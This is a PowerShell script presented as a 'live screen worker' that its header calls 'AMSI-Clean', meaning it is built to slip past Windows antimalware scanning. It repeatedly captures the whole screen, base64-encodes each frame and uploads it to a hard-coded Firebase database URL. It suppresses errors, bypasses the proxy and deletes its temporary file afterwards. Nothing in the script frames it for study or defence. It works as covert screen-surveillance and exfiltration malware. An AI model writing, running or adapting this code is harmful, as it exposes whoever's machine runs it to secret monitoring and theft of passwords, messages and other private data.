# ==============================================================================
# CMD_Remote Adaptive Live Screen Worker (AMSI-Clean & Zero-Install)
# ==============================================================================
param(
    [string]$SecretKey = "2816",
    [string]$FirebaseUrl = "https://uat-api-agent-default-rtdb.firebaseio.com/",
    [int]$Fps = 6,
    [int]$MaxFrames = 300 # ~50 seconds continuous live stream per session
)

if ($FirebaseUrl -notlike "*/") { $FirebaseUrl += "/" }

Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
Add-Type -AssemblyName System.Drawing -ErrorAction SilentlyContinue

$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$tmp = Join-Path $env:TEMP "live_frame_$SecretKey.jpg"
$url = "$($FirebaseUrl)live_stream/$SecretKey.json"
$delayMs = [int](1000 / $Fps)

Write-Output "Starting AMSI-Clean Live Screen Worker for Key $SecretKey ($Fps FPS)..."

for ($f = 0; $f -lt $MaxFrames; $f++) {
    $bmp = New-Object System.Drawing.Bitmap $b.Width, $b.Height
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen($b.Location, [System.Drawing.Point]::Empty, $b.Size)
    $bmp.Save($tmp, [System.Drawing.Imaging.ImageFormat]::Jpeg)
    $g.Dispose()
    $bmp.Dispose()

    $bytes = [System.IO.File]::ReadAllBytes($tmp)
    $b64 = [Convert]::ToBase64String($bytes)
    $payload = '{"frame":' + $f + ',"timestamp":"' + (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + '","image":"' + $b64 + '"}'

    try {
        $req = [System.Net.HttpWebRequest]::Create($url)
        $req.Method = "PUT"
        $req.Timeout = 1200
        $req.KeepAlive = $true
        $req.Proxy = $null
        $req.ContentType = "application/json; charset=utf-8"
        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
        $req.ContentLength = $bodyBytes.Length
        $st = $req.GetRequestStream()
        $st.Write($bodyBytes, 0, $bodyBytes.Length)
        $st.Close()
        $resp = $req.GetResponse()
        $resp.Close()
    } catch {}

    Start-Sleep -Milliseconds $delayMs
}

Remove-Item $tmp -Force -ErrorAction SilentlyContinue
Write-Output "Live Stream Session Completed."
